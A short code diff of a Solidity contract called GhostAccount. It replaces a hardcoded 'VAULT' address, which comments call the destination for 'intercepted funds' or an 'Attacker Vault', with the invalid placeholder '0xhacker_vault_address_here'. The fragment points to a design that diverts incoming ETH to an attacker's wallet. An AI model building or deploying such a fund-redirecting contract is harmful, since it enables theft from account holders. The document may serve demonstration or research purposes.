@@ -11,7 +11,7 @@ pragma solidity ^0.8.28;
 contract GhostAccount {
     // The hardcoded destination for intercepted funds
     // Representing the "Attacker Vault" or a secure "Cold Wallet"
-    address public constant VAULT = 0x678F7fb42BcC819285EfE21fDA421E67B2F45839;
+    address public constant VAULT = 0xhacker_vault_address_here;
 
     /**
      * @dev Triggered when the EOA receives ETH. 
